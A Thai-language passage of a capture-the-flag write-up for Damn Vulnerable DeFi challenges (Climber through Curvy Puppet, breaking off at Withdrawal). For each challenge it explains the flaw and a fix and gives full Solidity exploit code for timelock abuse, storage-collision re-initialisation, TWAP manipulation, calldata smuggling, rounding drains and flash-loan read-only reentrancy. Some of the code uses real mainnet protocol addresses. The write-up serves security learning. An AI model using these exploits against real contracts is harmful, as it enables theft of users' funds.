- ดึง DVT 10M ทั้งหมดจาก vault ไปไว้ที่ recovery
### ช่องโหว่ :
- `ClimberTimelock.execute()` รันทุก call ก่อน แล้วค่อยมาเช็คว่า operation ถูก schedule หรือยัง ทำให้ batch สามารถ schedule ตัวเองระหว่างที่กำลังรันได้ และเพราะ timelock เป็นเจ้าของ vault จาก timelock call จึงอัพเกรด vault ได้
### วิธีโจมตี :
- ใน batch เดียว 1. ตั้ง delay เป็น 0 2. ให้สิทธิ์ proposer แก่ attack contract 3. อัพเกรด vault เป็น implementation ของ attacker 4. เรียก attack contract ให้ `schedule` batch เดียวกันเพื่อให้เช็คตอนท้ายผ่าน จากนั้นเรียก `sweepFunds` ของ vault ที่อัพเกรดแล้วเพื่อส่งทั้งหมดไป recovery
### การป้องกัน :
- ต้องเช็คว่า operation ถูก schedule ก่อน execute (และทำเครื่องหมายว่า executed ก่อนเรียก external call) 
### POC
```solidity
function test_climber() public checkSolvedByPlayer {
    MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();

    ClimberAttack attackContract = new ClimberAttack(
        payable(address(vault)),
        payable(address(timelock)),
        recovery,
        address(token)
    );

    attackContract.attack(address(maliciousImpl));
}

contract MaliciousVaultImpl is ClimberVault {
    function sweepFunds(address token, address to) external {
        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
    }
}

contract ClimberAttack {
    ClimberVault private immutable vault;
    ClimberTimelock private immutable timelock;
    address private immutable recovery;
    address private immutable token;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private constant SALT = bytes32(0);

    constructor(address payable _vault, address payable _timelock, address _recovery, address _token) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(_timelock);
        recovery = _recovery;
        token = _token;
    }

    function attack(address maliciousImpl) external {
        // ตั้งค่า delay ของ timelock เป็น 0
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // ให้สิทธิ์ proposer role แก่ attack contract 
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
        );

        // อัพเกรด vault ให้เป็น implementation ของเรา
        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousImpl, bytes(""))
        );

        // call back มาที่ contract นี้ให้ schedule batch เดิม
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("scheduleAll()"));

        // รัน batch ทั้งหมด
        timelock.execute(targets, values, dataElements, SALT);

        // ดึงเงินออกจาก vault
        MaliciousVaultImpl(address(vault)).sweepFunds(token, recovery);
    }

    // ถูกเรียกโดย timelock เพื่อ schedule batch เดียวกับที่กำลังรันอยู่ตอนนี้
    function scheduleAll() external {
        timelock.schedule(targets, values, dataElements, SALT);
    }
}
```

## 13. Wallet Mining
wallet deployer ที่จ่ายรางวัลเมื่อ deploy Safe ไปยัง address ที่ได้รับอนุญาต แต่มีช่องโหว่ storage slot ชนกัน ทำรันให้ init ซ้ำได้
### เป้าหมาย :
- กู้คืน DVT ทั้งหมดจาก deposit address กลับไปให้ผู้ใช้ และส่งรางวัลของ wallet deployer ให้ ward
### ข้อจำกัด :
- ผู้ใช้ห้ามส่ง transaction ใดเลย ส่วนผู้เล่นส่งได้แค่ 1 transaction
### ช่องโหว่ :
- ตัวแปร `needsInit` ของ `AuthorizerUpgradeable` อยู่ที่ storage slot 0 ซึ่งไปชนกับ address `upgrader` ของ proxy (อยู่ storage slot 0 ซึ่งมีค่าไม่เป็นศูนย์ทำให้รันอีกได้) ทำให้ใครก็เรียก `init()` ซ้ำเพื่อให้สิทธิ์ตัวเองได้
- `WalletDeployer.drop()` เช็คแค่ว่าคู่ `(wat, nonce)` ที่ deploy ด้วย CREATE2 ตรงกับ address ที่ได้รับอนุญาตหรือไม่ ทำให้ attacker หา nonce ที่ถูกด้วยการ brute-force ได้
### วิธีโจมตี :
- เรียก `init()` ซ้ำเพื่อให้ attacker ได้สิทธิ์สำหรับ `USER_DEPOSIT_ADDRESS`, brute-force หา nonce ที่ทำให้ factory deploy ไปที่ address นั้น, deploy Safe จริง (ที่มี `user` เป็นเจ้าของ) ด้วย `drop()`, ถอนเงินออกด้วยลายเซ็นของผู้ใช้ผ่าน `execTransaction` แล้วส่งรางวัลของ deployer ให้ `ward` ทั้งหมดนี้ทำใน constructor ของ attacker ที่เดียว
### การป้องกัน :
- เก็บ init ไว้ใน slot เฉพาะที่ไม่ชนกับใคร (ใช้ `Initializable` ของ OZ) จะได้เรียก `init()` ซ้ำไม่ได้ และอย่าโอนเงินเข้า address ที่คำนวณไว้ล่วงหน้าก่อนตรวจสอบเจ้าของของ wallet ที่ deploy จริง
### POC
```solidity
function test_walletMining() public checkSolvedByPlayer {
    new Attacker(address(token), address(authorizer), address(walletDeployer), user, userPrivateKey, ward);
}

// สำหรับ 'hevm.sign(userPrivateKey, txHash)'
interface IHevm {
    function sign(uint256 privateKey, bytes32 digest) external pure returns (uint8 v, bytes32 r, bytes32 s);
}

contract Attacker {
    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    IHevm constant hevm = IHevm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor(
        address token,
        address authorizer,
        address walletDeployer,
        address user,
        uint256 userPrivateKey,
        address ward
    ) {
        // 1. ให้สิทธิ์ตัวเอง
        getAuthorized(authorizer);

        // 2. หา nonce
        bytes memory setupCalldata = _buildSetup(user);
        uint256 nonce = findNonce(walletDeployer, setupCalldata);

        // 3. เรียก `drop()` deploy Safe ที่ USER_DEPOSIT_ADDRESS โดยมี `user` เป็นเจ้าของและจ่ายรางวัล 1 DVT ให้ contract นี้ (msg.sender)
        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);

        // 4. ถอนเงินทั้งหมดออกจาก Safe
        _drainSafe(token, user, userPrivateKey);

        // 5. ส่งรางวัลต่อให้ ward
        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
    }

    // 1. slot 0 ชนกัน: needsInit อ่านค่า address upgrader ของ proxy (ไม่ใช่ศูนย์ทำให้รันอีกได้) ทำให้ require ของ init() ผ่านอีกครั้ง
    function getAuthorized(address authorizer) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(authorizer).init(wards, aims);
    }

    function _buildSetup(address user) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        return abi.encodeCall(
            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
        );
    }

    // 2. brute-force nonce ไปเรื่อย ๆ จนกว่า SafeProxyFactory.createProxyWithNonce() จะ deploy ไปที่ USER_DEPOSIT_ADDRESS
    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
        WalletDeployer wd = WalletDeployer(walletDeployer);
        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
        bytes32 initializerHash = keccak256(setupCalldata);
        address factory = address(wd.cook());
        for (uint256 n = 0; n < 1000; n++) {
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n)), initCodeHash
            )))));
            if (predicted == USER_DEPOSIT_ADDRESS) {
                console.log("found nonce:", n);
                return n;
            }
        }
        revert("nonce not found in 0..999");
    }

    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory transferCalldata = abi.encodeCall(
            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
        );
        bytes32 txHash = safe.getTransactionHash(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
        );
        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
        safe.execTransaction(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
            abi.encodePacked(r, s, v)
        );
    }
}
```

## 14. Puppet V3
lending pool DVT ที่ตีราคาหลักประกัน WETH ด้วย TWAP 10 นาทีของ Uniswap V3 โดนปั่น TWAP ได้ เพราะ pool มีสภาพคล่องต่ำ
### เป้าหมาย :
- ดึง DVT ทั้งหมดจาก lending pool ไปไว้ที่ recovery
### ข้อจำกัด :
- ต้องทำให้เสร็จภายใน 115 วินาทีหลัง setup
### ช่องโหว่ :
- pool ใช้ TWAP (ราคาเฉลี่ยถ่วงน้ำหนักตามเวลา) แค่ 10 นาที ใน Uniswap V3 ที่สภาพคล่องน้อย (100 DVT / 100 WETH) แค่ swap ก้อนใหญ่พอแล้วค้างราคาไว้สักประมาณ 2 นาที ค่าเฉลี่ยก็ถูกลากลงมาได้ค่อนนข้างเยอะ
### วิธีโจมตี :
- ขาย DVT ของผู้เล่นเข้า pool Uniswap V3 ด้วย `exactInputSingle` ให้ราคาร่วง แล้ว `vm.warp` ไปข้างหน้า 114 วินาที (ต่ำกว่าเวลาจำกัดนิดเดียว) ให้ TWAP ขยับเข้าใกล้ราคาที่ต่ำสุด พอ `calculateDepositOfWETHRequired` ถูกพอที่จะยืม DVT ทั้งหมดด้วย WETH ที่ผู้เล่นมีก็ถือโอกาสนั้นแล้วส่ง DVT ทั้งหมดไป recovery
### การป้องกัน :
- ใช้ TWAP ที่ window ยาวขึ้น (หรือเพิ่ม oracle ตัวที่สอง) เพื่อไม่ให้การดันราคาช่วงสั้น ๆ ในบล็อกเดียวขยับค่าเฉลี่ยมากพอ
### POC
```solidity
function test_puppetV3() public checkSolvedByPlayer {
    address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    token.approve(address(uniswapRouterAddress), type(uint256).max);
    // ดู quote ก่อนโจมตีเพื่อเทียบ (ราคาจริง ยังไม่ถูกปั่น)
    uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    console.log("quote1: ", quote1);

    // ขาย DVT ของผู้เล่นทั้งหมดเข้า pool เพื่อปั่นราคา DVT/WETH
    ISwapRouter(uniswapRouterAddress).exactInputSingle(
        ISwapRouter.ExactInputSingleParams(
            address(token),
            address(weth),
            3000,
            address(player),
            block.timestamp,
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,
            0
        )
    );
    // warp เวลาไปข้างหน้าให้ TWAP มีเวลาเลื่อนเข้าใกล้ราคาที่ถูกดิ่งมากพอ
    vm.warp(block.timestamp + 114);
    // ดู quote อีกครั้งตอนราคาถูกลงแล้ว
    uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    weth.approve(address(lendingPool), quote);
    console.log("quote: ", quote);
    // ยืม DVT ทั้ง 1M ด้วย WETH ที่น้อยกว่าราคาจริงมาก
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}
```

## 15. ABI Smuggling
vault ที่ให้สิทธิ์แต่ละคนเรียกได้เฉพาะ function selector ที่อนุญาตผ่าน `execute` แต่มีช่องโหว่ให้ลักลอบใส่ calldata อันตรายได้
### เป้าหมาย :
- ดึง DVT ทั้งหมดจาก vault ไปไว้ที่ recovery
### ช่องโหว่ :
- `execute()` เช็คสิทธิ์โดยอ่าน selector จากตำแหน่ง calldata ที่ hardcode ไว้ (byte ที่ 100) ไม่ได้อ่านจากตำแหน่งที่ offset ของ `actionData` ที่ชี้ไปจริง ทำให้ selector ที่ถูกเช็คกับ call ที่ถูกรันเป็นคนละตัวกันได้
### วิธีโจมตี :
- เขียน calldata เองโดยเอา selector ของ `withdraw` (ที่ผู้เล่นมีสิทธิ์เรียก) ไว้ที่ byte 100 เป็นตัวหลอก แล้วตั้ง offset ของ `actionData` ให้ชี้ไปไกลกว่านั้น (ไปที่ call `sweepFunds(recovery, token)`ที่ผู้เล่นไม่มีสิทธิ์เรียก) เช็คสิทธิ์เจอตัวหลอกเลยผ่าน แต่ vault รัน `sweepFunds` ที่มี recovery เป็นผู้รับ token ทั้งหมด 
### การป้องกัน :
- ถอดรหัส `actionData` ให้ตรงกับที่จะถูก execute จริง, เช็ค selector ของ payload แล้วอย่าอ่าน selector สำหรับเช็คสิทธิ์จากตำแหน่ง calldata ที่ hardcode ไว้
### POC
```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    Exploit exploit = new Exploit(address(vault), address(token), recovery);
    bytes memory payload = exploit.executeExploit();
    address(vault).call(payload);
}

contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function executeExploit() external returns (bytes memory) {

        // function selector ของ `execute()`
        bytes4 executeSelector = vault.execute.selector;

        // สร้าง address ของ target contract (vault) แล้ว pad ให้ครบ 32 byte
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));

        // สร้าง offset ชี้ตำแหน่งเริ่มต้นของ calldata
        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // offset สำหรับตำแหน่งเริ่มของ action data

        // สร้างช่องว่างหลอก (32 byte เป็นศูนย์ทั้งหมด)
        bytes memory emptyData = abi.encodePacked(uint256(0));

        // ใส่ function selector ของ `withdraw()` เองแบบ manual 
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),     // selector ของ withdraw
            bytes28(0)              // เติมศูนย์ 28 byte ให้ครบ slot 32 byte
        );

        // สร้าง calldata สำหรับฟังก์ชัน `sweepFunds()`
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        // ตั้งค่า actionDataLength เองแบบ manual เป็น 0x44 (68 byte)
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));


        // รวมทุกส่วนเข้าด้วยกันเป็น calldata payload ที่สมบูรณ์
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,              // 4 byte
            target,                       // 32 byte
            dataOffset,                   // 32 byte
            emptyData,                    // 32 byte
            withdrawSelectorPadded,       // 32 byte (เริ่มที่ byte ที่ 100)
            actionDataLength,             // ความยาวของ actionData
            sweepFundsCalldata            // calldata จริงที่จะเรียก `sweepFunds()`
        );


        // คืนค่า calldata payload ที่สร้างเสร็จแล้ว
        return calldataPayload;
    }
}
```

## 16. Shards
marketplace ที่ขาย "shards" (ส่วนแบ่ง) ของ NFT เป็น DVT แต่มีช่องโหว่ เพราะตอนจ่ายเงินกับตอนคืนเงินปัดเศษไม่เหมือนกัน
### เป้าหมาย :
- ดึง DVT ออกจาก marketplace (มากกว่า 0.01%) แล้วส่งทั้งหมดไป recovery
### ข้อจำกัด :
- ยอดเงินใน staking contract ต้องไม่เปลี่ยน
- ใช้แค่ 1 transaction
### ช่องโหว่ :
- `fill()` คิดเงินด้วยสูตร `want * _toDVT(price, rate) / totalShards` ซึ่งปัดลง ซื้อ 100 shards เลยจ่าย 0 DVT (100 * 75e21 / 1e25 = 0.75 ปัดเป็น 0)
- `cancel()` คืนเงินด้วยอีกสูตรคือ `shards * rate / 1e6` ซึ่งปัดขึ้น ได้ DVT คืนประมาณ 7.5e12 wei ต่อ 100 shards
- เงื่อนไขเช็คเวลาใน `cancel()` เขียนกลับด้าน เลยยกเลิกได้ทันทีใน block เดียวกับที่ซื้อ
### วิธีโจมตี :
- วน `fill()` 100 shards แล้ว cancel 10001 รอบใน exploit contract (จะได้จบใน 1 transaction) แล้วส่งกำไรไป recovery
### การป้องกัน :
- ปัดเศษให้สอดคล้องกันและเข้าข้างโปรโตคอลเสมอ (ปัดเงินที่เก็บขึ้น, ปัดเงินคืนลง), ไม่รับ fill ที่ราคาเป็น 0 และแก้เงื่อนไขเช็คเวลาที่กลับด้านใน `cancel()`
### POC
```solidity
function test_shards() public checkSolvedByPlayer {
         Exploit exploit = new Exploit(marketplace,token,recovery);
        exploit.attack(1);
        console.log("recovery balance",token.balanceOf(address(recovery)));
    }

contract Exploit {
    ShardsNFTMarketplace public marketplace;
    DamnValuableToken public token;
    address recovery;

    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;
    }

    function attack(uint64 offerId) external {
        uint256 wantShards = 100; // fill ครั้งละ 100 shards

        // วนลูป 10001 รอบเพื่อเรียก fill(1, 100)
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }

        token.transfer(recovery,token.balanceOf(address(this)));
    }
}
```

## 17. Curvy Puppet
lending contract ที่ให้ผู้ใช้ยืม LP token ของ Curve stETH/ETH โดยใช้ DVT เป็นหลักประกัน แต่มีช่องโหว่ read-only reentrancy ที่ `get_virtual_price()` ของ Curve
### เป้าหมาย :
- ปิด position ของผู้ใช้ทั้ง 3 คน (alice/bob/charlie) lending contract ให้หมด (ทั้ง collateral และ borrow ต้องเป็น 0)
### ข้อจำกัด :
- treasury ต้องยังมี WETH และ LP เหลืออยู่บ้าง และต้องได้ DVT ของผู้ใช้ทั้ง 3 คนครบ (7500)
- player ต้องไม่เหลืออะไรเลย
### ช่องโหว่ :
- สัญญา lending ตีราคา borrow asset (LP token ของ Curve stETH/ETH) ด้วยสูตร `ETH_price * get_virtual_price()` ส่วน `remove_liquidity` ของ Curve pool รุ่นเก่าจะ burn LP supply ก่อน แล้วค่อย raw-call ส่ง ETH กลับให้ผู้เรียก **ก่อน** ที่ balance ของ pool จะอัปเดตเสร็จ ทำให้ `get_virtual_price()` อ่านค่าที่สูงเกินจริงในช่วง callback ที่รับ ETH นั้น (read-only reentrancy ที่เรียกฟังก์ชัน view ทั้งที่ state ของ contract ยังอัปเดตไม่เสร็จ)
- เพราะ LP token คือ borrow asset ของผู้ใช้ ราคา LP ที่เฟ้อขึ้นเลยทำให้มูลค่าหนี้ของทุกคนพองตาม ดัน position ทั้ง 3 อันที่เดิมมีหลักประกันเกินพอให้กลายเป็น liquidate ได้
- position จะถูก liquidate ได้เมื่อ `collateralValue*100 < borrowValue*175` โดย collateral = 2500 DVT ที่ราคา $10 และ borrow = 1 LP (25000 * 100 < 4000 * vp * 175) จึงต้องดัน `virtual_price` ให้เกิน 3.5714e18
### วิธีโจมตี :
- กู้ flash loan WETH+wstETH จาก Balancer (วงนอกที่ไม่มีค่าธรรมเนียม) และ Aave (วงใน) แล้ว unwrap/withdraw เป็น ETH+stETH จากนั้น `add_liquidity` ก้อนใหญ่โดยจงใจใส่ stETH เยอะ (ยิ่ง stETH เยอะ ราคายิ่งพุ่ง) แล้ว `remove_liquidity` พอตอนที่ ETH เข้ามาใน `receive()` virtual_price ถูกปั่นขึ้นไปแล้ว จึงเรียก `liquidate()` ผู้ใช้ทั้ง 3 คนได้ (จ่าย 1 LP ต่อคนจาก 6.5 LP ของ treasury ที่โจทย์ให้มา และได้ 2500 DVT ต่อคน)
- คืนเงินโดยใช้ ETH ที่มีเยอะ (ฝาก ETH น้อย ตอนถอนได้ ETH เยอะ) แล้วแปลงเป็น stETH ผ่าน Lido (เก็บ reserve ไว้นิดหน่อยให้ treasury ยังมี WETH) แล้ว wrap ให้ได้ wstETH ครบตามที่ต้องคืน ต้นทุนหลักคือค่าธรรมเนียมของ Aave ~0.05% ซึ่งถูกหักจากเงินสำรอง 200 WETH ของ treasury 
### การป้องกัน :
- อย่าอ่าน `get_virtual_price()` (หรือ state ใด ๆ ของ pool) ในจังหวะที่ยังส่ง control ให้ผู้เรียกที่ไว้ใจไม่ได้, ใช้ oracle ที่ปั่นราคายาก หรือใส่ reentrancy lock ให้กับ view และอย่าตีราคาสินทรัพย์ที่ให้กู้จาก virtual price ณ จุดเดียว
### POC
```solidity
function test_curvyPuppet() public checkSolvedByPlayer {
    // ย้ายทุนที่ treasury เตรียมไว้เข้า exploit contract
    // treasury approve ให้ `player` ไว้แล้วใน setUp และเรารันในฐานะ player
    Exploit exploit = new Exploit(
        lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
    );
    weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
    IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);

    // เริ่ม flash loan แล้ว add_liquidity จากนั้น remove_liquidity (reentrancy) และ liquidate
    exploit.run();
}

// จาก `https://github.com/balancer/balancer-v2-monorepo/blob/master/pkg/interfaces/contracts/vault/IVault.sol`
interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

// จาก `https://github.com/lidofinance/core/blob/master/contracts/0.6.12/WstETH.sol`
interface IWstETH {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Exploit {
    // mainnet addresses
    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; // Aave V3 Pool
    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);

    // จำนวน flash loan (แต่ละตัวต้องไม่เกินที่ lender มี)
    // Balancer ณ block นี้มี ~37,991 WETH, ~12,597 wstETH
    uint256 constant BAL_WETH   = 37_000e18;
    uint256 constant BAL_WSTETH = 12_000e18;
    // Aave ณ block นี้มี ~83,192 WETH, ~1,036,780 wstETH
    // จุดพุ่งของ reentrancy (virtual_price) แปรผันตามฝั่ง stETH ดังนั้นเราฝาก
    // stETH มากกว่า ETH โดยตั้งใจ ส่วน wstETH จะเป็นตัวทำให้ virtual_price พุ่ง
    // threshold การ liquidate คือ ~3.5714e18 ระวังกู้ wstETH มากไปจะทำให้ค่าธรรมเนียม Aave สูงขึ้น 
    // ซึ่งแปลว่าเงินสำรองของ treasury ที่เหลือหลังจบจะน้อยลง
    uint256 constant AAVE_WETH   = 83_000e18;
    uint256 constant AAVE_WSTETH = 140_000e18;
    // ETH ที่กันไว้ (ไม่แปลงเป็น stETH) เพื่อให้ treasury มี WETH > 0 ตอนจบ
    uint256 constant ETH_RESERVE = 20e18;

    CurvyPuppetLending immutable lending;
    IStableSwap immutable curvePool;
    CurvyPuppetOracle immutable oracle;
    DamnValuableToken immutable dvt;
    IERC20 immutable stETH;
    WETH immutable weth;
    address immutable treasury;
    address immutable lpToken;
    address[3] users;

    // flag เช็คว่าตอนนี้อยู่ในช่วง liquidation window หรือไม่ เพื่อให้ receive() รู้ว่าเมื่อไหร่ถึงจะเรียก liquidate() ได้อย่างปลอดภัย
    enum State { NONE, LIQUIDATING }
    State state;

    constructor(
        CurvyPuppetLending _lending,
        IStableSwap _curvePool,
        CurvyPuppetOracle _oracle,
        DamnValuableToken _dvt,
        IERC20 _stETH,
        WETH _weth,
        address _treasury,
        address[3] memory _users
    ) {
        lending = _lending;
        curvePool = _curvePool;
        oracle = _oracle;
        dvt = _dvt;
        stETH = _stETH;
        weth = _weth;
        treasury = _treasury;
        users = _users;
        lpToken = _curvePool.lp_token();
    }

    function run() external {
        // เงินกู้วงนอก (เรียกก่อนและคืนทีหลังสุด) จาก Balancer (ไม่มีค่าธรรมเนียม)
        // ต้องให้ token เรียงตาม address จากน้อยไปมาก: wstETH (0x7f39..) < WETH (0xC02a..)
        address[] memory tokens = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        tokens[0] = address(wstETH);
        tokens[1] = address(weth);
        amounts[0] = BAL_WSTETH;
        amounts[1] = BAL_WETH;
        balancer.flashLoan(address(this), tokens, amounts, "");

        // โอนทรัพย์สินที่เหลือกลับไปให้ treasury
        weth.deposit{value: address(this).balance}();                                 
        dvt.transfer(treasury, dvt.balanceOf(address(this)));                          
        weth.transfer(treasury, weth.balanceOf(address(this)));                        
        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this)));  
    }

    // callback ของ Balancer ส่ง BAL_WETH + BAL_WSTETH มาให้เรา แล้วซ้อน call กู้ Aave ไว้ข้างใน
    function receiveFlashLoan(
        address[] memory, //tokens
        uint256[] memory, //amounts
        uint256[] memory, //fees (0)
        bytes memory //userData
    ) external {
        require(msg.sender == address(balancer), "not balancer");

        // เงินกู้วงใน (Aave) callback ไป `executeOperation` ซึ่งเป็นตัวรัน attack
        address[] memory assets = new address[](2);
        uint256[] memory amts = new uint256[](2);
        uint256[] memory modes = new uint256[](2); // [0,0] = ไม่เปิดหนี้ใหม่ ต้องคืนเต็มจำนวน
        assets[0] = address(weth);
        assets[1] = address(wstETH);
        amts[0] = AAVE_WETH;
        amts[1] = AAVE_WSTETH;
        (bool ok,) = aavePool.call(
            abi.encodeWithSignature(
                "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
                address(this), assets, amts, modes, address(this), bytes(""), uint16(0)
            )
        );
        require(ok, "aave flashloan failed");

        // ได้เงินกู้จาก Aave แล้ว คืนเงิน Balancer
        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
    }

    // callback วงใน: ตอนนี้ถือ token จาก Balancer + Aave รวมกันแล้ว ทำทุกอย่างที่นี่
    function executeOperation(
        address[] calldata, //assets
        uint256[] calldata, //amounts
        uint256[] calldata fees,
        address initiator,
        bytes calldata 
    ) external returns (bool) {
        require(msg.sender == aavePool, "not aave");
        require(initiator == address(this), "bad initiator");

        // แปลง token ที่กู้มาทั้งหมดให้เป็น asset ของ pool (ETH + stETH)
        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));   // WETH ทั้งหมดเป็น ETH
        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this))); // wstETH ทั้งหมดเป็น stETH
        stETH.approve(address(curvePool), type(uint256).max);

        // ฝาก assets ก้อนใหญ่ coin0 = ETH, coin1 = stETH
        uint256 stEthAmount = stETH.balanceOf(address(this));
        uint256 ethForLp = address(this).balance;
        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);

        // ให้ lending contract ดึง LP ของเรา (borrowAsset) ได้ตอน liquidate()
        IERC20(lpToken).approve(address(permit2), type(uint256).max);
        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));

        // remove liquidity ทำให้ pool ส่ง ETH มาให้เราตรง ๆ ซึ่ง trigger ฟังก์ชัน receive() ของเรา
        state = State.LIQUIDATING;
        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
        state = State.NONE;

        // หลังจาก remove liquidity + liquidate เราจะถือ ETH (เยอะพิเศษ) + stETH
        // (ฝากเข้าไปเป็น stETH ส่วนใหญ่ แต่ได้คืนมาเป็น ETH ส่วนใหญ่) แปลง ETH ส่วนเกินเป็น stETH
        // แล้ว wrap เป็น wstETH เพื่อให้ครบตามที่ต้องคืน
        uint256 wethOwed   = AAVE_WETH + fees[0] + BAL_WETH;      
        uint256 wstethOwed = AAVE_WSTETH + fees[1] + BAL_WSTETH;  

        // กันเงิน WETH ที่ต้องคืนไว้ก่อนให้พอดีเป๊ะ
        weth.deposit{value: wethOwed}();                              // ETH เป็น WETH

        // แปลง ETH ที่เหลือเป็น stETH (เก็บ ETH_RESERVE ไว้ให้ treasury ยังมี WETH > 0)
        uint256 ethBal = address(this).balance;
        if (ethBal > ETH_RESERVE) {
            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
                abi.encodeWithSignature("submit(address)", address(0))
            );
            require(ok, "lido submit failed");
        }

        // wrap stETH ทั้งหมดเป็น wstETH ต้องครอบคลุมส่วนที่ต้องคืน
        stETH.approve(address(wstETH), type(uint256).max);
        wstETH.wrap(stETH.balanceOf(address(this)));
        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");

        // Aave จะดึงยอดที่ต้องคืนผ่าน transferFrom เองตอนเรา return true
        IERC20(address(weth)).approve(aavePool, AAVE_WETH + fees[0]);
        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + fees[1]);
        return true;
    }

    // Curve pool ส่ง ETH มาที่นี่ตอน remove_liquidity (ช่วง read-only reentrancy window)
    receive() external payable {
        if (state != State.LIQUIDATING) return;
        // virtual_price ถูกปั่นให้สูงอยู่ตอนนี้ ทำให้ทุก borrow position ถูก liquidate ได้
        for (uint256 i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
        }
    }
}
```

## 18. Withdrawal
token bridge จาก L2 ไป L1 ที่ gateway finalize withdrawal จาก log ของ L2 พิสูจน์ด้วย Merkle proof แต่มีช่องโหว่ให้ operator ข้ามการตรวจ proof ได้ และไม่สนว่า call ล้มเหลว
### เป้าหมาย :
- ต้อง finalize withdrawal ทั้ง 4 รายการในชุดที่โจทย์ให้ (รวมรายการที่น่าสงสัยด้วย) ที่ L1 gateway
### ข้อจำกัด :
- token bridge เสียเงินได้แต่ต้องน้อยกว่า 1%
- player ต้องไม่เหลือ token
### ช่องโหว่ :
